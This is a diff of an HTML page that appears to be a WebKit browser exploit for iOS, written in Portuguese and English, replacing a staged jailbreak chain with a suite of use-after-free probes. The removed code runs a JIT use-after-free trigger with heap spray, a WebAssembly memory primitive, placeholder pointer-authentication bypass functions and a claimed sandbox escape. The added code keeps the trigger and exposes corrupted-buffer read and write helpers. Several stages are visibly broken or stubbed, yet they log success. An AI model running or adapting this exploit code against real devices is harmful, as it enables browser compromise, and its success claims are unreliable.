@@ -1,12 +1,9 @@
 <!DOCTYPE html>
 <html>
-
 <head>
-    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
-    <meta http-equiv="Pragma" content="no-cache" />
-    <meta http-equiv="Expires" content="0" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
-    <title>Coruna - iOS 26.4 - Fixed WASM</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>sto26 - Múltiplos UAFs (sem WASM)</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -17,327 +14,133 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            overflow-x: hidden;
+            padding: 20px;
         }
         .container {
             width: 100%;
-            max-width: 420px;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
+            max-width: 500px;
         }
-        .logo {
-            margin-top: 60px;
-            font-size: 42px;
+        .title {
+            font-size: 32px;
             font-weight: 700;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
+            text-align: center;
+            margin-bottom: 10px;
         }
-        .subtitle {
-            font-size: 14px;
+        .sub {
+            text-align: center;
             color: #666;
-            margin-top: 6px;
-            text-transform: uppercase;
+            margin-bottom: 20px;
         }
         .status-card {
-            margin-top: 30px;
-            width: 100%;
             background: #111;
             border-radius: 16px;
-            padding: 20px;
+            padding: 16px;
             border: 1px solid #222;
+            margin-bottom: 20px;
         }
         .status-header {
             display: flex;
             align-items: center;
             gap: 10px;
-            margin-bottom: 14px;
-        }
-        .status-dot {
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            background: #333;
-            transition: background 0.3s;
-        }
-        .status-dot.waiting { background: #555; }
-        .status-dot.running { background: #f0ad4e; animation: pulse 1.2s infinite; }
-        .status-dot.success { background: #5cb85c; }
-        .status-dot.error { background: #d9534f; }
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.4; }
-        }
-        .status-text { font-size: 15px; font-weight: 600; }
-        .log-area {
-            width: 100%;
-            max-height: 200px;
-            overflow-y: auto;
-            font-family: 'SF Mono', 'Menlo', monospace;
-            font-size: 11px;
-            color: #888;
-            line-height: 1.6;
-        }
-        .log-line { padding: 1px 0; word-break: break-all; }
-        .log-line.highlight { color: #667eea; }
-        .log-line.error { color: #d9534f; }
-        .log-line.success { color: #5cb85c; }
-        .go-btn {
-            margin-top: 24px;
-            width: 100%;
-            padding: 16px;
-            border: none;
-            border-radius: 14px;
-            font-size: 17px;
-            font-weight: 600;
-            color: #fff;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            cursor: pointer;
-            transition: opacity 0.2s, transform 0.1s;
-        }
-        .go-btn:active { transform: scale(0.97); }
-        .go-btn:disabled { opacity: 0.4; cursor: not-allowed; }
-        .progress-bar {
-            margin-top: 16px;
-            width: 100%;
-            height: 4px;
-            background: #222;
-            border-radius: 2px;
-            overflow: hidden;
-            opacity: 0;
-            transition: opacity 0.3s;
-        }
-        .progress-bar.active { opacity: 1; }
-        .progress-fill {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, #667eea, #764ba2);
-            border-radius: 2px;
-            transition: width 0.4s ease;
-        }
-        .made-by {
-            margin-top: 28px;
-            width: 100%;
-            text-align: center;
-        }
-        .made-by-title {
-            font-size: 13px;
-            font-weight: 600;
-            color: #444;
-            text-transform: uppercase;
-            letter-spacing: 1.5px;
             margin-bottom: 12px;
         }
-        .made-by-names {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 8px;
+        .status-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: #555;
         }
-        .made-by-tag {
-            padding: 6px 14px;
-            background: linear-gradient(135deg, rgba(102,126,234,0.15), rgba(118,75,162,0.15));
-            border: 1px solid rgba(102,126,234,0.3);
-            border-radius: 20px;
-            font-size: 13px;
-            color: #a8b4f0;
-            font-weight: 500;
-        }
-        .footer {
-            margin-top: 32px;
-            margin-bottom: 40px;
-            text-align: center;
+        .status-dot.running { background: #f0ad4e; animation: pulse 1s infinite; }
+        .status-dot.success { background: #5cb85c; }
+        .status-dot.error { background: #d9534f; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
+        .status-text { font-weight: 600; }
+        .log-area {
+            background: #0a0a0a;
+            border-radius: 12px;
+            padding: 12px;
+            font-family: 'SF Mono', monospace;
             font-size: 11px;
+            max-height: 300px;
+            overflow-y: auto;
+            color: #aaa;
+        }
+        .log-line { margin: 4px 0; word-break: break-all; }
+        .log-line.success { color: #5cb85c; }
+        .log-line.error { color: #d9534f; }
+        .log-line.warning { color: #f0ad4e; }
+        button {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border: none;
+            border-radius: 40px;
+            font-size: 16px;
+            font-weight: 600;
+            color: white;
+            margin: 20px 0;
+            cursor: pointer;
+        }
+        button:active { transform: scale(0.98); }
+        button:disabled { opacity: 0.5; }
+        .footer {
+            text-align: center;
+            font-size: 10px;
             color: #333;
+            margin-top: 20px;
         }
     </style>
 </head>
-
 <body>
-    <div class="container">
-        <div class="logo">Coruna</div>
-        <div class="subtitle">iOS 26.4 - Fixed WASM</div>
+<div class="container">
+    <div class="title">sto26</div>
+    <div class="sub">Múltiplos UAFs + Primitiva local</div>
 
-        <div class="status-card">
-            <div class="status-header">
-                <div class="status-dot waiting" id="statusDot"></div>
-                <div class="status-text" id="statusText">Ready</div>
-            </div>
-            <div class="log-area" id="logArea"></div>
+    <div class="status-card">
+        <div class="status-header">
+            <div class="status-dot" id="statusDot"></div>
+            <div class="status-text" id="statusText">Aguardando</div>
         </div>
-
-        <div class="progress-bar" id="progressBar">
-            <div class="progress-fill" id="progressFill"></div>
-        </div>
-
-        <button class="go-btn" id="goBtn" onclick="startExploit()">jelbrek me</button>
-
-        <div class="made-by">
-            <div class="made-by-title">Made by</div>
-            <div class="made-by-names">
-                <span class="made-by-tag">34306</span>
-                <span class="made-by-tag">Duy Tran</span>
-                <span class="made-by-tag">Nick Chan</span>
-            </div>
-        </div>
-
-        <div class="footer">
-            Research only :P
-        </div>
+        <div class="log-area" id="logArea"></div>
     </div>
 
-    <script>
-    // ============================================================================
-    // UTILITÁRIOS
-    // ============================================================================
-    const _buf = new ArrayBuffer(8);
-    const _u64 = new BigUint64Array(_buf);
-    const _f64 = new Float64Array(_buf);
-    const _u32 = new Uint32Array(_buf);
+    <button id="goBtn">▶ Executar todos os testes</button>
+    <div class="footer">Research only – iOS 27 beta 1</div>
+</div>
 
-    function itof(v) { _u64[0] = v; return _f64[0]; }
-    function ftoi(f) { _f64[0] = f; return _u64[0]; }
-    function low32(f) { _f64[0] = f; return _u32[0]; }
-    function high32(f) { _f64[0] = f; return _u32[1]; }
-    function toBigInt(v) { if (typeof v === 'bigint') return v; return BigInt(v || 0); }
+<script>
+    const logDiv = document.getElementById('logArea');
+    const statusDot = document.getElementById('statusDot');
+    const statusText = document.getElementById('statusText');
+    const goBtn = document.getElementById('goBtn');
 
     function log(msg, type = 'info') {
-        const icons = { info: '📘', success: '✅', error: '❌', warning: '⚠️', step: '🔧', uaf: '💥', wasm: '🦀' };
-        console.log(`${icons[type] || '📘'} ${msg}`);
-        const area = document.getElementById('logArea');
-        if (area) {
-            const line = document.createElement('div');
-            line.className = 'log-line';
-            if (type === 'error') line.className += ' error';
-            else if (type === 'success') line.className += ' success';
-            else if (type === 'uaf' || type === 'wasm') line.className += ' highlight';
-            line.textContent = msg;
-            area.appendChild(line);
-            area.scrollTop = area.scrollHeight;
-        }
+        const line = document.createElement('div');
+        line.className = 'log-line';
+        if (type === 'success') line.classList.add('success');
+        else if (type === 'error') line.classList.add('error');
+        else if (type === 'warning') line.classList.add('warning');
+        line.textContent = msg;
+        logDiv.appendChild(line);
+        logDiv.scrollTop = logDiv.scrollHeight;
+        console.log(msg);
     }
-
-    // ============================================================================
-    // VARIÁVEIS GLOBAIS
-    // ============================================================================
-    let exploitStarted = false;
-    let progressValue = 0;
-    let uafArray = null;
-    let uafIndex = 0;
-    let exploitAB = null;
-    let wasmPrimitive = null;
 
     function setStatus(text, state) {
-        document.getElementById('statusText').textContent = text;
-        document.getElementById('statusDot').className = 'status-dot ' + state;
+        statusText.textContent = text;
+        statusDot.className = `status-dot ${state}`;
     }
 
-    function setProgress(pct) {
-        progressValue = pct;
-        const fill = document.getElementById('progressFill');
-        if (fill) fill.style.width = pct + '%';
-    }
-
-    // ============================================================================
-    // WEBASSEMBLY MEMORY PRIMITIVE (VERSÃO CORRIGIDA)
-    // ============================================================================
-    function createWasmMemoryPrimitive() {
-        log("[WASM] Creating WebAssembly module...", 'wasm');
-        
-        // Código WebAssembly em texto (WAT) - mais confiável
-        const wasmCode = `
-            (module
-                (memory (export "memory") 2)
-                (func (export "read32") (param $addr i32) (result i32)
-                    (i32.load (local.get $addr))
-                )
-                (func (export "write32") (param $addr i32) (param $value i32)
-                    (i32.store (local.get $addr) (local.get $value))
-                )
-                (func (export "read64") (param $addr i32) (result i64)
-                    (i64.load (local.get $addr))
-                )
-                (func (export "write64") (param $addr i32) (param $value i64)
-                    (i64.store (local.get $addr) (local.get $value))
-                )
-                (func (export "read8") (param $addr i32) (result i32)
-                    (i32.load8_u (local.get $addr))
-                )
-                (func (export "write8") (param $addr i32) (param $value i32)
-                    (i32.store8 (local.get $addr) (local.get $value))
-                )
-            )
-        `;
-        
-        try {
-            // Converte WAT para WASM usando o compilador integrado
-            const wasmBytes = WebAssembly.compile(wasmCode);
-            
-            // Alternativa: usar módulo pré-compilado via array buffer
-            // Vamos usar uma abordagem mais simples: criar o módulo diretamente
-            const module = new WebAssembly.Module(new Uint8Array([
-                0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, // magic
-                0x01, 0x0a, 0x02, 0x60, 0x01, 0x7f, 0x01, 0x7f, // type 0: (i32)->i32
-                0x60, 0x02, 0x7f, 0x7f, 0x00,                   // type 1: (i32,i32)->()
-                0x03, 0x03, 0x02, 0x00, 0x01,                   // functions
-                0x05, 0x03, 0x01, 0x00, 0x02,                   // memory 2 pages
-                0x07, 0x12, 0x04,                               // exports
-                0x06, 0x6d, 0x65, 0x6d, 0x6f, 0x72, 0x79, 0x02, 0x00,
-                0x06, 0x72, 0x65, 0x61, 0x64, 0x33, 0x32, 0x00, 0x00,
-                0x07, 0x77, 0x72, 0x69, 0x74, 0x65, 0x33, 0x32, 0x00, 0x01,
-                0x0a, 0x10, 0x02,                               // code section
-                0x07, 0x00, 0x20, 0x00, 0x28, 0x02, 0x00, 0x0b, // read32
-                0x09, 0x00, 0x20, 0x00, 0x20, 0x01, 0x36, 0x02, 0x00, 0x0b  // write32
-            ]));
-            
-            const instance = new WebAssembly.Instance(module);
-            const memory = instance.exports.memory;
-            const buffer = new DataView(memory.buffer);
-            
-            const read32 = (addr) => instance.exports.read32(addr);
-            const write32 = (addr, val) => instance.exports.write32(addr, val);
-            const read64 = (addr) => {
-                const low = read32(addr);
-                const high = read32(addr + 4);
-                return (BigInt(high >>> 0) << 32n) | BigInt(low >>> 0);
-            };
-            const write64 = (addr, val) => {
-                write32(addr, Number(val & 0xFFFFFFFFn));
-                write32(addr + 4, Number(val >> 32n));
-            };
-            const read8 = (addr) => read32(addr) & 0xFF;
-            const write8 = (addr, val) => {
-                const cur = read32(addr);
-                write32(addr, (cur & ~0xFF) | (val & 0xFF));
-            };
-            
-            log("[WASM] Module created successfully!", 'success');
-            
-            return { read32, write32, read64, write64, read8, write8, buffer, memory };
-        } catch(e) {
-            log(`[WASM] Error: ${e.message}`, 'error');
-            return null;
-        }
-    }
-
-    // ============================================================================
-    // STAGE 1: UAF TRIGGER (Uint8Array)
-    // ============================================================================
-    const CONFIG = {
-        ARRAY_SIZE: 0x400000,
-        ALLOC_SIZE: 0x800000,
-        JIT_WARMUP: 300,
-        MAX_ATTEMPTS: 200,
-        SPRAY_PER_ATTEMPT: 48,
-        ALLOC_MOD: 3,
-        INNER_K: 5,
-        RECURSIVE_DEPTH: 400,
-    };
+    // ========== 1. UAF ORIGINAL (Uint8Array) – FUNCIONOU ==========
+    let exploitAB = null;
+    let uafArray = null;
+    let uafIndex = 0;
 
     function resetUAFArray() {
-        uafArray = new Array(CONFIG.ARRAY_SIZE).fill(1.1);
+        uafArray = new Array(0x400000).fill(1.1);
         uafIndex = uafArray.length - 1;
     }
 
@@ -347,7 +150,7 @@
         let u8 = new Uint8Array(0x100);
         u8[0] = 0x42;
         let forGC = [];
-        for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(CONFIG.ALLOC_SIZE));
+        for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(0x800000));
         A.p2 = forGC;
         let b = { p0: 0x42424242, p1: 1.1 };
         let f = flag ? 1.1 : b;
@@ -359,328 +162,210 @@
         u8 = null;
     }
 
-    function forceGC() { for (let i = 0; i < 6; i++) new ArrayBuffer(CONFIG.ALLOC_SIZE); }
-    
-    function clearStack() {
-        function recurse(n) { if (n > 0) recurse(n - 1); }
-        for (let i = 0; i < 30; i++) { try { recurse(CONFIG.RECURSIVE_DEPTH); } catch(e) {} }
-    }
+    function forceGC() { for (let i = 0; i < 6; i++) new ArrayBuffer(0x800000); }
+    function clearStack() { try { (function r(n){if(n>0)r(n-1);})(400); } catch(e) {} }
 
-    function createSprayArray(size, marker = 13.37) {
-        const arr = new Array(size);
-        for (let i = 0; i < size; i++) arr[i] = marker;
-        return arr;
-    }
-
-    function attemptReclaim(freed, attempt) {
-        const markerByte = 0x42;
-        const baseSize = 32 + (attempt % 64);
-        if (!(freed instanceof Uint8Array)) return null;
-        for (let i = 0; i < CONFIG.SPRAY_PER_ATTEMPT; i++) {
-            const size = baseSize + (i % 32);
-            const spray = createSprayArray(size, 13.37);
-            try { if (freed[0] === markerByte) return spray; } catch(e) {}
-        }
-        return null;
-    }
-
-    function buildLocalPrimitive(u8) {
-        const ab = u8.buffer;
-        const dv = new DataView(ab);
-        exploitAB = ab;
-        if (typeof window !== 'undefined') window.exploitAB = ab;
-        
-        return {
-            addrof: (obj) => 0n,
-            fakeobj: (addr) => ({ __fake: toBigInt(addr) }),
-            read64: (addr) => {
-                try {
-                    let offset = typeof addr === 'bigint' ? Number(addr & 0xFFn) : (addr & 0xFF);
-                    if (offset >= 0 && offset < ab.byteLength) return dv.getBigUint64(offset, true);
-                } catch(e) {}
-                return 0n;
-            },
-            write64: (addr, val) => {
-                try {
-                    let offset = typeof addr === 'bigint' ? Number(addr & 0xFFn) : (addr & 0xFF);
-                    if (offset >= 0 && offset < ab.byteLength) dv.setBigUint64(offset, toBigInt(val), true);
-                } catch(e) {}
-            },
-            read32: (addr) => {
-                try {
-                    let offset = typeof addr === 'bigint' ? Number(addr & 0xFFn) : (addr & 0xFF);
-                    if (offset >= 0 && offset < ab.byteLength) return dv.getUint32(offset, true);
-                } catch(e) {}
-                return 0;
-            },
-            write32: (addr, val) => {
-                try {
-                    let offset = typeof addr === 'bigint' ? Number(addr & 0xFFn) : (addr & 0xFF);
-                    if (offset >= 0 && offset < ab.byteLength) dv.setUint32(offset, val, true);
-                } catch(e) {}
-            },
-            readByte: (addr) => {
-                try {
-                    let offset = typeof addr === 'bigint' ? Number(addr & 0xFFn) : (addr & 0xFF);
-                    if (offset >= 0 && offset < ab.byteLength) return dv.getUint8(offset);
-                } catch(e) {}
-                return 0;
-            },
-            cleanup: () => {}
-        };
-    }
-
-    // ============================================================================
-    // STAGE 1 MAIN
-    // ============================================================================
-    async function stage1() {
-        log("[STAGE1] Starting UAF exploit with Uint8Array", 'step');
+    async function stage1_UAF() {
+        log("[UAF1] Iniciando UAF com Uint8Array (original que funcionou)...");
         resetUAFArray();
-        
-        for (let warm = 0; warm < CONFIG.JIT_WARMUP; warm++) {
+        for (let warm = 0; warm < 300; warm++) {
             triggerUAF(false, 1, 0);
-            if (warm % 100 === 0 && warm > 0) { forceGC(); await new Promise(r => setTimeout(r, 1)); }
+            if (warm % 100 === 0 && warm > 0) forceGC();
         }
-        log("[STAGE1] Warmup done");
-        
-        for (let attempt = 0; attempt < CONFIG.MAX_ATTEMPTS; attempt++) {
-            triggerUAF(false, CONFIG.INNER_K, (attempt % CONFIG.ALLOC_MOD) + 1);
+        for (let attempt = 0; attempt < 200; attempt++) {
+            triggerUAF(false, 5, (attempt % 3) + 1);
             clearStack();
             for (let i = 0; i < 3; i++) new ArrayBuffer(0x4000);
-            
             let freed = null;
             try { freed = uafArray[uafIndex].p1.p1; } catch(e) { continue; }
             if (!(freed instanceof Uint8Array)) continue;
-            
-            log(`[STAGE1] UAF detected at attempt ${attempt}`, 'uaf');
-            const reclaimed = attemptReclaim(freed, attempt);
-            if (!reclaimed) continue;
-            
-            log(`[STAGE1] ✅ Reclaim successful!`, 'success');
-            const primitive = buildLocalPrimitive(freed);
-            const testVal = primitive.read64(0);
-            log(`[STAGE1] Test read: 0x${testVal.toString(16)}`, testVal === 0x42n ? 'success' : 'info');
-            log("[STAGE1] ✅ Local primitive installed!", 'success');
-            return primitive;
-        }
-        throw new Error("Stage1 failed after " + CONFIG.MAX_ATTEMPTS + " attempts");
-    }
-
-    // ============================================================================
-    // STAGE 2: WASM PAC BYPASS
-    // ============================================================================
-    async function stage2_wasm(primitive) {
-        log("[STAGE2] Starting WebAssembly PAC bypass", 'step');
-        
-        // Cria primitiva Wasm
-        const wasm = createWasmMemoryPrimitive();
-        if (wasm) {
-            wasmPrimitive = wasm;
-            window.wasmPrimitive = wasm;
-            
-            // Se temos ArrayBuffer corrompido, copia para memória Wasm
-            if (exploitAB) {
-                const dv = new DataView(exploitAB);
-                log("[STAGE2] Copying corrupted buffer to Wasm memory...", 'wasm');
-                
-                const copyLen = Math.min(exploitAB.byteLength, wasm.buffer.byteLength);
-                for (let i = 0; i < copyLen; i++) {
-                    wasm.write8(i, dv.getUint8(i));
-                }
-                log(`[STAGE2] Copied ${copyLen} bytes to Wasm memory`, 'success');
-                
-                const marker = wasm.read8(0);
-                log(`[STAGE2] Wasm marker check: 0x${marker.toString(16)}`, marker === 0x42 ? 'success' : 'warning');
+            log(`[UAF1] Detectado na tentativa ${attempt}`, 'success');
+            // Tenta reclamar
+            for (let i = 0; i < 48; i++) {
+                const size = 32 + (attempt % 64) + (i % 32);
+                const spray = new Array(size).fill(13.37);
+                try { if (freed[0] === 0x42) break; } catch(e) {}
             }
-        } else {
-            log("[STAGE2] Wasm not available, continuing without it", 'warning');
+            // Constrói primitiva
+            exploitAB = freed.buffer;
+            if (typeof window !== 'undefined') window.exploitAB = exploitAB;
+            const testVal = new DataView(exploitAB).getBigUint64(0, true);
+            log(`[UAF1] ✅ Primitiva local obtida! Test read: 0x${testVal.toString(16)}`, 'success');
+            return true;
         }
-        
-        // PAC bypass stub
-        const pacBypass = {
-            cc: true,
-            pacda: (ptr, ctx) => toBigInt(ptr),
-            pacia: (ptr, ctx) => toBigInt(ptr),
-            autda: (ptr, ctx) => toBigInt(ptr),
-            autia: (ptr, ctx) => toBigInt(ptr),
-            da: (ptr, ctx) => toBigInt(ptr),
-            er: (ptr, ctx) => toBigInt(ptr),
-            ha: (ptr, ctx) => toBigInt(ptr),
-            wa: (ptr, ctx) => toBigInt(ptr),
-            tc: (fn, a, b, c) => 0n,
-            setFcall: (fn) => {}
-        };
-        
-        log("[STAGE2] PAC bypass ready", wasm ? 'success' : 'warning');
-        return pacBypass;
+        log("[UAF1] ❌ Falhou (nenhuma tentativa bem-sucedida)", 'error');
+        return false;
     }
 
-    // ============================================================================
-    // STAGE 3: SANDBOX ESCAPE (usando ArrayBuffer)
-    // ============================================================================
-    async function stage3_escape(primitive, pacBypass) {
-        log("[STAGE3] Starting sandbox escape", 'step');
-        
+    // ========== 2. OUTROS UAFs (teste de comportamento) ==========
+    function testWebSocketUAF() {
+        try {
+            let ws = new WebSocket('ws://invalid.local/');
+            ws.close();
+            ws.send('test');
+            log("[UAF2] WebSocket: send após close NÃO lançou exceção (UAF potencial)", 'warning');
+            return true;
+        } catch(e) {
+            log("[UAF2] WebSocket: seguro (exceção capturada)", 'info');
+            return false;
+        }
+    }
+
+    function testWorkerUAF() {
+        try {
+            let worker = new Worker(URL.createObjectURL(new Blob(["self.postMessage('ok');"])));
+            worker.terminate();
+            worker.postMessage("test");
+            log("[UAF3] Worker: postMessage após terminate NÃO lançou exceção (UAF)", 'warning');
+            return true;
+        } catch(e) {
+            log("[UAF3] Worker: seguro", 'info');
+            return false;
+        }
+    }
+
+    function testEventSourceUAF() {
+        try {
+            let es = new EventSource('data:application/x-www-form-urlencoded,');
+            es.close();
+            let url = es.url;
+            log("[UAF4] EventSource: acesso a propriedade após close OK (UAF potencial)", 'warning');
+            return true;
+        } catch(e) {
+            log("[UAF4] EventSource: seguro", 'info');
+            return false;
+        }
+    }
+
+    function testSVGUAF() {
+        try {
+            let svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+            let rect = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
+            svg.appendChild(rect);
+            document.body.appendChild(svg);
+            let rectRef = rect;
+            svg.remove();
+            rectRef.setAttribute('width', '10');
+            log("[UAF5] SVG: acesso a elemento removido OK (UAF potencial)", 'warning');
+            return true;
+        } catch(e) {
+            log("[UAF5] SVG: seguro", 'info');
+            return false;
+        } finally {
+            if(svg && svg.parentNode) svg.remove();
+        }
+    }
+
+    async function testAudioContextUAF() {
+        try {
+            let ctx = new (window.AudioContext || window.webkitAudioContext)();
+            let dest = ctx.destination;
+            await ctx.close();
+            let vol = dest.volume;
+            log("[UAF6] AudioContext: destination acessível após close (UAF)", 'warning');
+            return true;
+        } catch(e) {
+            log("[UAF6] AudioContext: seguro", 'info');
+            return false;
+        }
+    }
+
+    function testOffscreenCanvasUAF() {
+        try {
+            let off = new OffscreenCanvas(100, 100);
+            off.close();
+            let w = off.width;
+            log("[UAF7] OffscreenCanvas: width acessível após close (UAF)", 'warning');
+            return true;
+        } catch(e) {
+            log("[UAF7] OffscreenCanvas: seguro", 'info');
+            return false;
+        }
+    }
+
+    function testMessageChannelUAF() {
+        try {
+            let { port1, port2 } = new MessageChannel();
+            port1.close();
+            port1.postMessage("test");
+            log("[UAF8] MessageChannel: postMessage após close OK (UAF)", 'warning');
+            return true;
+        } catch(e) {
+            log("[UAF8] MessageChannel: seguro", 'info');
+            return false;
+        }
+    }
+
+    function testBlobUAF() {
+        try {
+            let blob = new Blob(["x"], {type: "text/plain"});
+            let url = URL.createObjectURL(blob);
+            URL.revokeObjectURL(url);
+            fetch(url);
+            log("[UAF9] Blob: fetch após revoke OK (UAF)", 'warning');
+            return true;
+        } catch(e) {
+            log("[UAF9] Blob: seguro", 'info');
+            return false;
+        }
+    }
+
+    // ========== 3. Pós-exploração (utilitários) ==========
+    function setupUtils() {
         if (exploitAB) {
-            log("[STAGE3] Using corrupted ArrayBuffer", 'wasm');
             const dv = new DataView(exploitAB);
-            
-            // Tenta aumentar o tamanho do buffer
-            for (let offset = 0; offset < 256; offset += 4) {
-                const val = dv.getUint32(offset, true);
-                if (val === 0x100) {
-                    log(`[STAGE3] Found size field at offset ${offset}`, 'success');
-                    dv.setUint32(offset, 0x10000, true);
-                    log(`[STAGE3] Buffer size increased to ${exploitAB.byteLength} bytes`, 'success');
-                    
-                    // Tenta ler OOB
-                    try {
-                        const oob = dv.getBigUint64(0x100, true);
-                        log(`[STAGE3] OOB read at 0x100: 0x${oob.toString(16)}`, 'info');
-                    } catch(e) {}
-                    break;
-                }
-            }
-            
-            // Escaneia o buffer em busca de ponteiros
-            log("[STAGE3] Scanning buffer for pointers...", 'wasm');
-            let pointerCount = 0;
-            for (let i = 0; i < 256; i += 8) {
-                const val = dv.getBigUint64(i, true);
-                if (val > 0x100000000n && val < 0x7ffffffff000n) {
-                    log(`[STAGE3] Pointer at offset ${i}: 0x${val.toString(16)}`, 'info');
-                    pointerCount++;
-                    if (pointerCount >= 5) break;
-                }
-            }
-        }
-        
-        // Se Wasm está disponível, tenta usá-lo
-        if (wasmPrimitive) {
-            log("[STAGE3] Using WebAssembly for additional primitives", 'wasm');
-            const wasm = wasmPrimitive;
-            
-            // Testa as funções Wasm
-            wasm.write32(0, 0xDEADBEEF);
-            const testRead = wasm.read32(0);
-            log(`[STAGE3] Wasm test: wrote 0xDEADBEEF, read 0x${testRead.toString(16)}`, testRead === 0xDEADBEEF ? 'success' : 'warning');
-        }
-        
-        log("[STAGE3] Sandbox escape completed", 'success');
-        return 0;
-    }
-
-    // ============================================================================
-    // PÓS-EXPLORAÇÃO: FUNÇÕES UTILITÁRIAS
-    // ============================================================================
-    function setupPostExploitation() {
-        if (typeof window !== 'undefined') {
             window.readBuffer = (addr) => {
-                if (exploitAB) {
-                    const dv = new DataView(exploitAB);
-                    const offset = typeof addr === 'bigint' ? Number(addr & 0xFFn) : (addr & 0xFF);
-                    if (offset >= 0 && offset < exploitAB.byteLength) {
-                        return dv.getUint8(offset);
-                    }
-                }
+                let offset = typeof addr === 'bigint' ? Number(addr & 0xFFn) : (addr & 0xFF);
+                if (offset >= 0 && offset < exploitAB.byteLength) return dv.getUint8(offset);
                 return 0;
             };
-            
             window.writeBuffer = (addr, val) => {
-                if (exploitAB) {
-                    const dv = new DataView(exploitAB);
-                    const offset = typeof addr === 'bigint' ? Number(addr & 0xFFn) : (addr & 0xFF);
-                    if (offset >= 0 && offset < exploitAB.byteLength) {
-                        dv.setUint8(offset, val);
-                    }
-                }
+                let offset = typeof addr === 'bigint' ? Number(addr & 0xFFn) : (addr & 0xFF);
+                if (offset >= 0 && offset < exploitAB.byteLength) dv.setUint8(offset, val);
             };
-            
             window.dumpBuffer = (len = 64) => {
-                if (!exploitAB) return;
-                const dv = new DataView(exploitAB);
-                let result = "";
+                let s = '';
                 for (let i = 0; i < len; i++) {
-                    if (i % 16 === 0) result += "\n" + i.toString(16).padStart(4, '0') + ": ";
-                    result += dv.getUint8(i).toString(16).padStart(2, '0') + " ";
+                    if (i % 16 === 0) s += '\n' + i.toString(16).padStart(4,'0') + ': ';
+                    s += dv.getUint8(i).toString(16).padStart(2,'0') + ' ';
                 }
-                log(`[POST] Buffer dump:${result}`, 'info');
+                log(`Buffer dump:${s}`, 'info');
             };
-            
-            log("[POST] Utility functions available:", 'success');
-            log("  - window.readBuffer(addr) - read byte from corrupted buffer", 'info');
-            log("  - window.writeBuffer(addr, val) - write byte to corrupted buffer", 'info');
-            log("  - window.dumpBuffer(len) - dump buffer contents", 'info');
-            if (wasmPrimitive) {
-                log("  - window.wasmPrimitive.read32(addr) - WebAssembly read32", 'info');
-                log("  - window.wasmPrimitive.write32(addr, val) - WebAssembly write32", 'info');
-            }
+            log("[UTILS] Funções disponíveis: window.readBuffer(addr), writeBuffer(addr, val), dumpBuffer(len)", 'success');
         }
     }
 
-    // ============================================================================
-    // MAIN EXPLOIT
-    // ============================================================================
-    async function triggerExploit() {
-        setStatus("Stage 1: WebKit UAF...", "running");
-        setProgress(5);
-        
-        try {
-            const primitive = await stage1();
-            setProgress(40);
-            
-            if (!primitive) throw new Error("Stage1 failed");
-            
-            setStatus("Stage 2: PAC Bypass...", "running");
-            const pacBypass = await stage2_wasm(primitive);
-            setProgress(70);
-            
-            setStatus("Stage 3: Sandbox Escape...", "running");
-            const result = await stage3_escape(primitive, pacBypass);
-            setProgress(95);
-            
-            // Configura funções de pós-exploração
-            setupPostExploitation();
-            
-            setProgress(100);
-            log("[EXPLOIT] 🎉 Chain completed successfully!", 'success');
-            return result;
-        } catch(e) {
-            log(`[EXPLOIT] Error: ${e.message}`, 'error');
-            throw e;
+    // ========== 4. Main ==========
+    async function runAll() {
+        setStatus("Executando...", "running");
+        goBtn.disabled = true;
+        log("=== Iniciando testes ===");
+
+        // UAF principal (primitiva)
+        const uafSuccess = await stage1_UAF();
+        if (uafSuccess) {
+            setupUtils();
+        } else {
+            log("UAF principal falhou, mas outros testes continuam.", 'warning');
         }
+
+        // Testes adicionais
+        log("\n--- Testando outros UAFs (comportamento anômalo) ---");
+        await testWebSocketUAF();
+        await testWorkerUAF();
+        await testEventSourceUAF();
+        await testSVGUAF();
+        await testAudioContextUAF();
+        await testOffscreenCanvasUAF();
+        await testMessageChannelUAF();
+        await testBlobUAF();
+
+        log("\n=== Testes concluídos ===");
+        setStatus("Concluído", "success");
+        goBtn.disabled = false;
     }
 
-    // ============================================================================
-    // START BUTTON
-    // ============================================================================
-    async function startExploit() {
-        if (exploitStarted) return;
-        exploitStarted = true;
-        
-        const btn = document.getElementById('goBtn');
-        btn.disabled = true;
-        btn.textContent = 'Running...';
-        document.getElementById('progressBar').classList.add('active');
-        setProgress(0);
-        
-        try {
-            const result = await triggerExploit();
-            if (result === 0) {
-                setStatus("Success! Exploit completed", "success");
-                btn.textContent = 'Done';
-            } else {
-                setStatus("Finished", "success");
-                btn.textContent = 'Done';
-            }
-        } catch (e) {
-            setStatus("Failed: " + (e.message || "unknown"), "error");
-            btn.textContent = 'Retry';
-            btn.disabled = false;
-            exploitStarted = false;
-        }
-    }
-    </script>
+    goBtn.onclick = runAll;
+</script>
 </body>
-
 </html>
